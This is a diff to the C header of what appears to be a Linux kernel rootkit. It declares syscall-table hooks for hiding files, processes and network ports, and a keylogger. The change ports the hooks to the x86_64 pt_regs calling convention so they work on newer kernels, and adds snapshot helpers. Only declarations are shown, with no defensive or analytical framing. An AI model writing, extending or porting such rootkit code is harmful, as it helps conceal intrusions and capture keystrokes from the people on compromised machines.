@@ -36,9 +36,9 @@
 #include <linux/file.h>
 #include <linux/fs_struct.h>
 #include <linux/pid.h>
+#include <linux/ptrace.h>
 #include <asm/cacheflush.h>
 #include <asm/io.h>
-#include <asm/uaccess.h>
 #include <asm/unistd.h>
 
 /* -- Module metadata -- */
@@ -122,20 +122,22 @@ void restore_wp(int saved_cr0);
 int install_hook(struct hooked_syscall *h);
 void remove_hook(struct hooked_syscall *h);
 
-/* file_hide.c */
-asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp,
-                                   unsigned int count);
-asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent __user *dirp,
-                                  unsigned int count);
-asmlinkage long hooked_openat(int dirfd, const char __user *pathname,
-                               int flags, umode_t mode);
-asmlinkage long hooked_unlinkat(int dirfd, const char __user *pathname, int flags);
-asmlinkage long hooked_write(unsigned int fd, const char __user *buf, size_t count);
+/* file_hide.c
+ * NOTE: on x86_64 the sys_call_table entries are __x64_sys_* functions that
+ * receive a single `struct pt_regs *` argument. Hooks MUST use this signature
+ * and extract syscall arguments from the registers (regs->di/si/dx/r10/r8/r9).
+ */
+asmlinkage long hooked_getdents64(const struct pt_regs *regs);
+asmlinkage long hooked_getdents(const struct pt_regs *regs);
+asmlinkage long hooked_openat(const struct pt_regs *regs);
+asmlinkage long hooked_unlinkat(const struct pt_regs *regs);
+asmlinkage long hooked_write(const struct pt_regs *regs);
 void file_hide_add(const char *name);
 void file_hide_del(const char *name);
 int file_hide_init(void);
 void file_hide_cleanup(void);
 int is_file_hidden(const char *name);
+int file_hide_snapshot(char (*dst)[256], int max);
 
 /* proc_hide.c */
 void proc_hide_add(int pid);
@@ -144,15 +146,16 @@ int proc_hide_init(void);
 void proc_hide_cleanup(void);
 int is_pid_hidden(int pid);
 int is_proc_pid_hidden(const char *d_name);
-asmlinkage long hooked_kill(pid_t pid, int sig);
+int proc_hide_snapshot(int *dst, int max);
+asmlinkage long hooked_kill(const struct pt_regs *regs);
 
 /* net_hide.c */
 void net_hide_add_port(uint16_t port);
 void net_hide_del_port(uint16_t port);
 int net_hide_init(void);
 void net_hide_cleanup(void);
-asmlinkage ssize_t hooked_read(unsigned int fd, char __user *buf,
-                               size_t count);
+int net_hide_snapshot(uint16_t *dst, int max);
+asmlinkage long hooked_read(const struct pt_regs *regs);
 
 /* keylogger.c */
 int keylogger_init(void);
